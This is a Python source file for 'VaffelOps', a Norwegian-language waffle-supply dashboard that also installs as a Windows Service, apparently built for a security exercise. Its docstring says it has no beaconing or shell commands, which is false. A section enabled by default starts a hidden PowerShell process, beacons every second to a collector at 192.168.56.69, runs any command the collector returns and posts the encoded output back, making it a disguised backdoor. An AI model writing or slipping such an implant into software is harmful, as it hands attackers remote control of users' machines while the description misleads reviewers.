"""VaffelOps: web app + native Windows Service support in one source file.

Run locally: python app.py --console
Build on Windows: py -m PyInstaller --onefile --noconsole --name VaffelOps \
    --add-data "templates\\index.html:templates" app.py

After packaging, the same VaffelOps.exe is a Windows Service binary.
Only the benign local web app is included; no beaconing or shell commands.
"""

import ctypes
import json
import os
import sys
import threading
from datetime import datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
import base64

SERVICE_NAME = "VaffelOpsSvc"
WEB_BIND = os.getenv("WEB_BIND", "0.0.0.0")
WEB_PORT = int(os.getenv("WEB_PORT", "8000"))
BUNDLE_DIR = Path(getattr(sys, "_MEIPASS", Path(__file__).resolve().parent))
TEMPLATE_FILE = BUNDLE_DIR / "templates" / "index.html"
HTML = TEMPLATE_FILE.read_bytes() if TEMPLATE_FILE.exists() else (
    b"<!doctype html><html><meta charset='utf-8'>"
    b"<title>VaffelOps</title><h1>VaffelOps</h1>"
    b"<p>Missing templates/index.html</p></html>"
)


# --------- SaaRBARHET / OVELSESKODE STARTER HER ----------------

ENABLE_LAB_BEACON = os.getenv("ENABLE_LAB_BEACON", "1") == "1"
LAB_COLLECTOR_URL = os.getenv(
    "LAB_COLLECTOR_URL", "http://192.168.56.69:5050/checkin"
)
LAB_NODE_NAME = os.getenv("LAB_NODE_NAME", "WELFARE-01")
LAB_BEACON_INTERVAL = max(1, int(os.getenv("LAB_BEACON_INTERVAL", "1")))


import subprocess
import threading
import queue
import uuid
import time
import json
import urllib.request
import urllib.error

from datetime import datetime, timezone


# Tillatte kommandoer fra collector
SHELL_TIMEOUT = 15
MAX_OUTPUT = 4096


def sendToShellSubprocess(proc, command):
    if proc.poll() is not None:
        raise RuntimeError("CMD-prosessen er avsluttet")

    if not hasattr(proc, "_output_queue"):
        proc._output_queue = queue.Queue(maxsize=256)

        def reader():
            try:
                for line in proc.stdout:
                    proc._output_queue.put(line)
            finally:
                proc._output_queue.put(None)

        threading.Thread(
            target=reader,
            daemon=True
        ).start()

    # Unik sluttmarkOr for hver kommando
    marker = f"__FERDIG_{uuid.uuid4().hex}__"
    proc._marker = marker

    full_cmd = f"{command}\r\necho {marker}\r\n"

    proc.stdin.write(full_cmd)
    proc.stdin.flush()


def readFromShellSubprocess(proc):
    output = []
    total = 0
    deadline = time.monotonic() + SHELL_TIMEOUT

    while True:
        remaining = deadline - time.monotonic()

        if remaining <= 0:
            proc.kill()
            return "Feil: CMD timeout"

        try:
            line = proc._output_queue.get(timeout=remaining)
        except queue.Empty:
            proc.kill()
            return "Feil: CMD timeout"

        if line is None:
            return "Feil: CMD-prosessen ble avsluttet"

        if line.strip().endswith(proc._marker):
            break

        # Begrens mengden returnert output
        if total < MAX_OUTPUT:
            chunk = line[:MAX_OUTPUT - total]
            output.append(chunk)
            total += len(chunk)

    return "".join(output).strip()


def execute_lab_action(action, pipe):
    if action == "NOOP":
        return "Ingen handling"

    try:
        sendToShellSubprocess(pipe, action)
        return readFromShellSubprocess(pipe)
    except (OSError, RuntimeError) as exc:
        return f"Feil ved CMD-kjOring: {exc}"


def lab_action_loop():
    pending_result = None
    shell_proc = None

    try:
        while True:
            # Start eller gjenopprett CMD
            if shell_proc is None or shell_proc.poll() is not None:
                try:
                    shell_proc = subprocess.Popen(
                        [
                            "powershell.exe",
                            "-NoLogo",
                            "-NoProfile",
                            "-NonInteractive",
                            "-Command", "-"
                        ],
                        stdin=subprocess.PIPE,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.STDOUT,
                        text=True,
                        errors="replace",
                        bufsize=1, 
                        creationflags=subprocess.CREATE_NO_WINDOW
                    )
                except OSError as exc:
                    time.sleep(LAB_BEACON_INTERVAL)
                    continue

            payload = {
                "service": "VaffelOps",
                "host_label": LAB_NODE_NAME,
                "event": "status-checkin",
                "sent_at_utc": datetime.now(
                    timezone.utc
                ).isoformat(),  
                "last_result": base64.b64encode(json.dumps(pending_result).encode("utf-8")).decode("utf-8") if pending_result else None,
            }

            request = urllib.request.Request(
                LAB_COLLECTOR_URL,
                data=json.dumps(payload).encode("utf-8"),
                headers={
                    "Content-Type": "application/json",
                    "User-Agent": "VaffelOps-Service/1.0",
                },
                method="POST",
            )

            try:
                with urllib.request.urlopen(
                    request, timeout=5
                ) as reply:
                    response = json.loads(reply.read(65536))

                if not isinstance(response, dict):
                    raise ValueError("Ugyldig serverrespons")

            except (
                urllib.error.URLError,
                TimeoutError,
                OSError,
                ValueError
            ) as exc:
                time.sleep(LAB_BEACON_INTERVAL)
                continue

            # HTTP-respons mottatt
            pending_result = None

            action = response.get("action", "NOOP")

            if not isinstance(action, str):
                action = "NOOP"

            if action != "NOOP":
                output = execute_lab_action(action, shell_proc)

                pending_result = {
                    "command_id": response.get("command_id"),
                    "action": action,
                    "output": output,
                }

            time.sleep(LAB_BEACON_INTERVAL)

    except KeyboardInterrupt:
        pass

    finally:
        if shell_proc is not None:
            if shell_proc.poll() is None:
                shell_proc.kill()
            shell_proc.wait()

_lock = threading.Lock()
_state = {
    "waffles": 12,
    "coffee": "KRITISK",
    "served": 128,
    "orders": 0,
    "events": [
        {"at": "08:14", "message": "Kaffemaskin rapportert ute av drift."},
        {"at": "08:31", "message": "Vaffelbeholdning under kritisk nivaa."},
        {"at": "08:42", "message": "Prioritet 1: Skaff mer syltetOy."},
    ],
}


def now_hm():
    return datetime.now().strftime("%H:%M")


def add_event(msg):
    # Caller holds _lock.
    _state["events"].insert(0, {"at": now_hm(), "message": msg})
    del _state["events"][8:]


def snapshot():
    with _lock:
        return json.loads(json.dumps(_state, ensure_ascii=False))


class Handler(BaseHTTPRequestHandler):
    server_version = "VaffelOps/1.0"

    def log_message(self, format, *args):
        pass

    def send_bytes(self, status, content_type, data):
        self.send_response(status)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(data)))
        self.send_header("Cache-Control", "no-store")
        self.send_header("X-Content-Type-Options", "nosniff")
        self.end_headers()
        try:
            self.wfile.write(data)
        except (BrokenPipeError, ConnectionResetError):
            pass

    def send_json(self, status, body):
        self.send_bytes(
            status,
            "application/json; charset=utf-8",
            json.dumps(body, ensure_ascii=False).encode("utf-8"),
        )

    def do_GET(self):
        if self.path in ("/", "/index.html"):
            self.send_bytes(200, "text/html; charset=utf-8", HTML)
        elif self.path == "/api/status":
            self.send_json(200, snapshot())
        elif self.path == "/health":
            self.send_json(200, {"status": "ok", "service": "VaffelOps"})
        else:
            self.send_json(404, {"error": "Fant ikke ressurs"})

    def do_POST(self):
        try:
            length = int(self.headers.get("Content-Length", "0"))
            if not 0 <= length <= 2048:
                raise ValueError("Ugyldig forespOrsel")
            body = json.loads(self.rfile.read(length) or b"{}")
            if not isinstance(body, dict):
                raise ValueError("Ugyldig forespOrsel")
        except (ValueError, TypeError, json.JSONDecodeError):
            return self.send_json(400, {"error": "Ugyldig JSON"})

        with _lock:
            if self.path == "/api/order":
                try:
                    amount = int(body.get("count", 1))
                except (ValueError, TypeError):
                    return self.send_json(400, {"error": "Ugyldig antall"})
                unit = str(body.get("unit", "Ukjent avdeling"))[:36].strip()
                if not 1 <= amount <= 10 or unit not in (
                    "Stab", "Samband", "SOC", "CyberOps", "BesOkende"
                ):
                    return self.send_json(400, {"error": "Ugyldig bestilling"})
                if amount > _state["waffles"]:
                    return self.send_json(409, {"error": "For faa vafler paa lager!"})
                _state["waffles"] -= amount
                _state["served"] += amount
                _state["orders"] += 1
                add_event(
                    f"{unit} rekvirerte {amount} "
                    f"{'vaffel' if amount == 1 else 'vafler'}."
                )
            elif self.path == "/api/refill":
                _state["waffles"] = 100
                add_event("Etterforsyning gjennomfOrt. Vaffelberedskap gjenopprettet.")
            elif self.path == "/api/coffee":
                _state["coffee"] = (
                    "OPERATIV" if _state["coffee"] == "KRITISK" else "KRITISK"
                )
                add_event(f"Kaffestatus endret til {_state['coffee']}.")
            elif self.path == "/api/reset":
                _state["waffles"] = 12
                _state["coffee"] = "KRITISK"
                _state["served"] = 128
                _state["orders"] = 0
                add_event("Ovelsen nullstilt til opprinnelig vaffelkrise.")
            else:
                return self.send_json(404, {"error": "Ukjent handling"})

            result = json.loads(json.dumps(_state, ensure_ascii=False))
        return self.send_json(200, result)


class VaffelHTTPServer(ThreadingHTTPServer):
    allow_reuse_address = True
    daemon_threads = True


def run_console():
    server = VaffelHTTPServer((WEB_BIND, WEB_PORT), Handler)
    print(f"VaffelOps: http://{WEB_BIND}:{WEB_PORT}/  (Ctrl+C for stop)")
    try:
        server.serve_forever(poll_interval=0.2)
    except KeyboardInterrupt:
        pass
    finally:
        server.server_close()


def run_windows_service():
    """Native SCM integration, without pywin32 or an external service wrapper."""
    if os.name != "nt":
        raise RuntimeError("Windows-tjenester stOttes kun paa Windows")

    from ctypes import wintypes

    advapi32 = ctypes.WinDLL("advapi32", use_last_error=True)
    SERVICE_WIN32_OWN_PROCESS = 0x10
    SERVICE_STOPPED = 1
    SERVICE_START_PENDING = 2
    SERVICE_STOP_PENDING = 3
    SERVICE_RUNNING = 4
    SERVICE_ACCEPT_STOP = 0x1
    SERVICE_ACCEPT_SHUTDOWN = 0x4
    SERVICE_CONTROL_STOP = 1
    SERVICE_CONTROL_SHUTDOWN = 5
    ERROR_SERVICE_SPECIFIC_ERROR = 1066

    class SERVICE_STATUS(ctypes.Structure):
        _fields_ = [
            ("dwServiceType", wintypes.DWORD),
            ("dwCurrentState", wintypes.DWORD),
            ("dwControlsAccepted", wintypes.DWORD),
            ("dwWin32ExitCode", wintypes.DWORD),
            ("dwServiceSpecificExitCode", wintypes.DWORD),
            ("dwCheckPoint", wintypes.DWORD),
            ("dwWaitHint", wintypes.DWORD),
        ]

    SERVICE_MAIN_FUNC = ctypes.WINFUNCTYPE(
        None, wintypes.DWORD, ctypes.POINTER(wintypes.LPWSTR)
    )
    HANDLER_EX_FUNC = ctypes.WINFUNCTYPE(
        wintypes.DWORD, wintypes.DWORD, wintypes.DWORD,
        wintypes.LPVOID, wintypes.LPVOID
    )

    class SERVICE_TABLE_ENTRYW(ctypes.Structure):
        _fields_ = [
            ("lpServiceName", wintypes.LPWSTR),
            ("lpServiceProc", SERVICE_MAIN_FUNC),
        ]

    advapi32.StartServiceCtrlDispatcherW.argtypes = [
        ctypes.POINTER(SERVICE_TABLE_ENTRYW)
    ]
    advapi32.StartServiceCtrlDispatcherW.restype = wintypes.BOOL
    advapi32.RegisterServiceCtrlHandlerExW.argtypes = [
        wintypes.LPCWSTR, HANDLER_EX_FUNC, wintypes.LPVOID
    ]
    advapi32.RegisterServiceCtrlHandlerExW.restype = wintypes.HANDLE
    advapi32.SetServiceStatus.argtypes = [
        wintypes.HANDLE, ctypes.POINTER(SERVICE_STATUS)
    ]
    advapi32.SetServiceStatus.restype = wintypes.BOOL

    stop_event = threading.Event()
    status_handle = None
    checkpoint = 0

    def report(state, exit_code=0):
        nonlocal checkpoint
        if not status_handle:
            return
        pending = state in (SERVICE_START_PENDING, SERVICE_STOP_PENDING)
        checkpoint = checkpoint + 1 if pending else 0
        status = SERVICE_STATUS(
            SERVICE_WIN32_OWN_PROCESS,
            state,
            SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN
            if state == SERVICE_RUNNING else 0,
            exit_code,
            0,
            checkpoint,
            30000 if pending else 0,
        )
        advapi32.SetServiceStatus(status_handle, ctypes.byref(status))

    @HANDLER_EX_FUNC
    def control_handler(control, event_type, event_data, context):
        if control in (SERVICE_CONTROL_STOP, SERVICE_CONTROL_SHUTDOWN):
            stop_event.set()
        return 0

    @SERVICE_MAIN_FUNC
    def service_main(argc, argv):
        nonlocal status_handle
        status_handle = advapi32.RegisterServiceCtrlHandlerExW(
            SERVICE_NAME, control_handler, None
        )
        if not status_handle:
            return
        report(SERVICE_START_PENDING)
        server = None
        thread = None
        failure_code = 0
        try:
            server = VaffelHTTPServer((WEB_BIND, WEB_PORT), Handler)
            thread = threading.Thread(
                target=server.serve_forever,
                kwargs={"poll_interval": 0.2},
                name="VaffelOps-HTTP",
                daemon=True,
            )
            thread.start()
            report(SERVICE_RUNNING)
            stop_event.wait()
        except Exception:
            failure_code = ERROR_SERVICE_SPECIFIC_ERROR
        finally:
            if server is not None:
                report(SERVICE_STOP_PENDING)
                if thread is not None and thread.is_alive():
                    server.shutdown()
                    thread.join(timeout=10)
                server.server_close()
            report(SERVICE_STOPPED, failure_code)

    # Keep callback objects and the service table alive while the dispatcher runs.
    service_table = (SERVICE_TABLE_ENTRYW * 2)(
        SERVICE_TABLE_ENTRYW(SERVICE_NAME, service_main),
        SERVICE_TABLE_ENTRYW(None, SERVICE_MAIN_FUNC()),
    )
    if not advapi32.StartServiceCtrlDispatcherW(service_table):
        code = ctypes.get_last_error()
        raise OSError(code, f"StartServiceCtrlDispatcherW failed ({code}); use --console when testing manually")


if __name__ == "__main__":
    if ENABLE_LAB_BEACON:
            threading.Thread(target=lab_action_loop, daemon=True).start()

    if "--console" in sys.argv or os.name != "nt":
        run_console()
    else:
        run_windows_service()
